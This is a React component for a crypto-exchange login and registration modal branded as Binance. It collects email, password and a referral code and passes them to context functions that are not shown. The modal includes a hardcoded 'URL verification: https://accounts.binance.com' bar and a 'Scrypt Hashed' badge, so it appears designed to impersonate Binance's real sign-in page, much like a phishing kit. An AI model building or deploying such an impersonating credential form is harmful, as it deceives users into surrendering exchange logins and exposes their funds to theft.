import React, { useState } from 'react';
import { X, ShieldCheck, Lock, Mail, KeyRound, CheckCircle2 } from 'lucide-react';
import { useExchange } from '../context/ExchangeContext';

export const AuthModal: React.FC = () => {
  const {
    authModalOpen,
    authModalMode,
    closeAuthModal,
    loginWithCredentials,
    registerAccount,
  } = useExchange();

  const [mode, setMode] = useState<'login' | 'register'>(authModalMode);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [referralCode, setReferralCode] = useState('');
  const [submitting, setSubmitting] = useState(false);

  React.useEffect(() => {
    setMode(authModalMode);
  }, [authModalMode]);

  if (!authModalOpen) return null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim() || !password) return;
    setSubmitting(true);
    try {
      if (mode === 'login') {
        await loginWithCredentials(email.trim(), password);
      } else {
        await registerAccount(email.trim(), password, referralCode.trim());
      }
    } finally {
      setSubmitting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/75 backdrop-blur-sm">
      <div className="relative w-full max-w-md bg-[var(--bg-secondary)] border border-[var(--border-color)] rounded-xl shadow-2xl overflow-hidden">
        {/* Top bar */}
        <div className="flex items-center justify-between px-6 pt-5 pb-3 border-b border-[var(--border-color)]">
          <div className="flex items-center gap-2">
            <svg className="w-5 h-5 fill-[#2E68FF]" viewBox="0 0 24 24" aria-hidden="true">
              <path d="M12 2.5L15.5 6L12 9.5L8.5 6L12 2.5Z" />
              <path d="M5.5 9L9 12.5L5.5 16L2 12.5L5.5 9Z" />
              <path d="M18.5 9L22 12.5L18.5 16L15 12.5L18.5 9Z" />
              <path d="M12 14.5L15.5 18L12 21.5L8.5 18L12 14.5Z" />
              <path d="M12 9.8L14.2 12L12 14.2L9.8 12L12 9.8Z" />
            </svg>
            <span className="font-display text-base font-bold text-[var(--text-primary)]">
              {mode === 'login' ? 'Log In to Binance' : 'Create Binance Account'}
            </span>
          </div>
          <button
            onClick={closeAuthModal}
            className="p-1.5 rounded-lg text-[var(--text-muted)] hover:text-[var(--text-primary)] hover:bg-[var(--bg-hover)]"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Security URL Verification Bar */}
        <div className="bg-[#0ECB81]/10 px-6 py-2 flex items-center gap-2 text-xs text-[#0ECB81] border-b border-[#0ECB81]/20">
          <Lock className="w-3.5 h-3.5 shrink-0" />
          <span>URL verification: https://accounts.binance.com</span>
        </div>

        <form onSubmit={handleSubmit} className="p-6 space-y-4">
          {/* Mode Tabs */}
          <div className="grid grid-cols-2 gap-1 p-1 bg-[var(--bg-primary)] rounded-lg border border-[var(--border-color)]">
            <button
              type="button"
              onClick={() => setMode('login')}
              className={`py-2 text-xs font-semibold rounded-md transition-colors cursor-pointer ${
                mode === 'login'
                  ? 'bg-[var(--bg-elevated)] text-[#2E68FF]'
                  : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'
              }`}
            >
              Log In
            </button>
            <button
              type="button"
              onClick={() => setMode('register')}
              className={`py-2 text-xs font-semibold rounded-md transition-colors cursor-pointer ${
                mode === 'register'
                  ? 'bg-[var(--bg-elevated)] text-[#2E68FF]'
                  : 'text-[var(--text-muted)] hover:text-[var(--text-primary)]'
              }`}
            >
              Register New Account
            </button>
          </div>

          <div>
            <label className="block text-xs font-medium text-[var(--text-secondary)] mb-1.5">
              Email Address
            </label>
            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#2E68FF]">
              <Mail className="w-4 h-4 text-[var(--text-muted)]" />
              <input
                type="email"
                required
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="you@example.com"
                className="w-full bg-transparent text-sm text-[var(--text-primary)] focus:outline-none"
              />
            </div>
          </div>

          <div>
            <label className="block text-xs font-medium text-[var(--text-secondary)] mb-1.5">
              Password (minimum 6 characters)
            </label>
            <div className="flex items-center gap-2 px-3 py-2.5 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] focus-within:border-[#2E68FF]">
              <KeyRound className="w-4 h-4 text-[var(--text-muted)]" />
              <input
                type="password"
                required
                minLength={6}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                className="w-full bg-transparent text-sm text-[var(--text-primary)] focus:outline-none"
              />
            </div>
          </div>

          {mode === 'register' && (
            <div>
              <label className="block text-xs font-medium text-[var(--text-secondary)] mb-1.5">
                Referral ID (Optional)
              </label>
              <input
                type="text"
                value={referralCode}
                onChange={(e) => setReferralCode(e.target.value)}
                placeholder="e.g. AX94F210"
                className="w-full px-3 py-2 rounded-lg bg-[var(--bg-primary)] border border-[var(--border-color)] text-sm text-[var(--text-primary)] font-mono-num focus:outline-none focus:border-[#2E68FF]"
              />
            </div>
          )}

          <button
            type="submit"
            disabled={submitting}
            className="w-full py-3 rounded-lg bg-[#2E68FF] hover:bg-[#1D4ED8] disabled:opacity-50 text-white font-bold text-sm transition-colors cursor-pointer shadow-md"
          >
            {submitting
              ? 'Verifying Credentials...'
              : mode === 'login'
              ? 'Log In'
              : 'Create Account & Initialize Wallets'}
          </button>

          <div className="pt-2 border-t border-[var(--border-color)] flex items-center justify-between text-xs text-[var(--text-muted)]">
            <span className="flex items-center gap-1.5">
              <ShieldCheck className="w-4 h-4 text-[#0ECB81]" />
              Scrypt Hashed & Session Protected
            </span>
            <button
              type="button"
              onClick={() => setMode(mode === 'login' ? 'register' : 'login')}
              className="text-[#2E68FF] font-semibold hover:underline cursor-pointer"
            >
              {mode === 'login' ? 'Need an account? Register' : 'Already registered? Log In'}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};
